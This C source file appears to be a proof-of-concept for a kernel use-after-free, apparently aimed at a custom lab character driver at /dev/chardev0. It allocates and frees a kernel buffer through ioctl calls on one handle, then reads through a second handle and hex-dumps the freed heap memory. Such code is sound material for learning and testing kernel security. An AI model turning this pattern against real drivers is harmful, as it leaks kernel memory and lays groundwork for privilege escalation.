#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include "chardev.h"
  
#define HEAP_SIZE 128

int main()
{
    int fd1,fd2,i,j;
    char info[HEAP_SIZE] = "Hello, Kernel UAF";
 
    if ((fd1 = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    if ((fd2 = open("/dev/chardev0", O_RDWR)) < 0){
        printf("Cannot open /dev/chardev0. Try again later.\n");
    }

    if (ioctl(fd1, KMALLOC, 168) < 0){
        printf("Error : KMALLOC.\n");
    }

    ioctl(fd1, KFREE);
    if (close(fd1) != 0){
        printf("Cannot close.\n");
    }

    memset(info, 0, HEAP_SIZE);
    read(fd2,info,HEAP_SIZE - 1);

    for (i = 0; i < 8; i++)
    {
        for (j = 0; j < 16; j++) printf("%02x ", info[i*16+j] & 0xff);
        printf(" | ");
        for (j = 0; j < 16; j++) printf("%c", info[i*16+j] & 0xff);
        printf("\n");
    }

    if (close(fd2) != 0){
        printf("Cannot close.\n");
    }
}

